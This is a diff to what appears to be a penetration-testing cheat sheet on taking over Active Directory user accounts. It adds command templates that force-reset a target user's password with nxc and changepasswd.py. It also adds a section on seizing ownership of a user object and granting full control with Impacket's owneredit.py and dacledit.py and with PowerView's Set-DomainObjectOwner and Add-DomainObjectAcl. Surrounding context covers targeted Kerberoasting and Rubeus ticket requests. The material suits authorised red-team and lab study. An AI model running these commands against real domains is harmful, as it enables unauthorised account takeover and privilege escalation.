@@ -22,6 +22,12 @@ net rpc password <target_user> -U <domain>/<username> -S <dc_ip>
 ```bash
 bloodyAD --host <dc_ip> -d <domain> -u <username> -p <password> set password svc_sql <new_password>
 ```
+```bash
+nxc smb <dc_host> -u <username> -p <password> -M change-password -o USER=<target_user> NEWPASS=<new_password>
+```
+```bash
+changepasswd.py <domain>/<username>:<password>@<dc_host> -altuser <target_user> -altpass <new_password>
+```
 
 ### Windows Perspective
 We may use PowerView's `Set-DomainUserPassword` function to force change the target's password.
@@ -30,7 +36,6 @@ Import-Module .\PowerView.ps1
 $NewPassword = ConvertTo-SecureString <new_password> -AsPlainText -Force
 Set-DomainUserPassword -Identity <target_user> -AccountPassword $NewPassword
 ```
-
 
 ## Targeted Kerberoasting
 We can leverage the ability to write the target user's `servicePrincipalName` property (`GenericAll` or `GenericWrite` access required) to create a fake SPN and Kerberoast it like a normal service account and recover the target user's password via offline cracking. However, our ability to recover the plaintext password depends on the user's password strength.
@@ -149,3 +154,29 @@ Then, we may use [Rubeus](https://github.com/GhostPack/Rubeus) to request a TGT 
 .\Rubeus.exe asktgt /user:<user> /certificate:<cert_file> /password:<cert_pass> /domain:<domain_fqdn> /dc:<dc_host> /getcredentials /show
 ```
 - If you get `KRB-ERROR (14) : KDC_ERR_ETYPE_NOTSUPP`, try setting `/enctype:aes128` or `/enctype:aes256`.
+
+## Modify Ownership
+If we are able to modify the owner object over a user account, we can change the owner to an object we control and give that object full control access, allowing us to use any of the three methods above to take control of the target user account.
+
+### Linux Perspective
+We use `owneredit.py` from Impacket to change the ownership of the user to an account we control.
+```bash
+owneredit.py -action write -owner <username> -target <target_user> <domain>/<user>:<password>
+```
+We then use `dacledit.py` from Impacket to give our user full control over the target user.
+```bash
+dacledit.py -action 'write' -rights 'FullControl' -principal <username> -target <target_user> <domain>/<username>:<password>
+```
+
+### Windows Perspective
+The PowerView function `Set-DomainObjectOwner` may be used to change the ownership of a user object from a domain-joined Windows machine. It must be ran from a process under the context of the user who has the access to modify ownership information over the target user, or we can create a PSCredential object, alternatively.
+```powershell
+$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $SecPassword)
+Set-DomainObjectOwner -Credential $Cred -TargetIdentity '<target_user>' -OwnerIdentity '<username>'
+```
+
+We then use `Add-DomainObjectAcl` function from PowerView to give our user `GenericAll` access to the target user object.
+```powershell
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity <target_user> -Rights All
+```
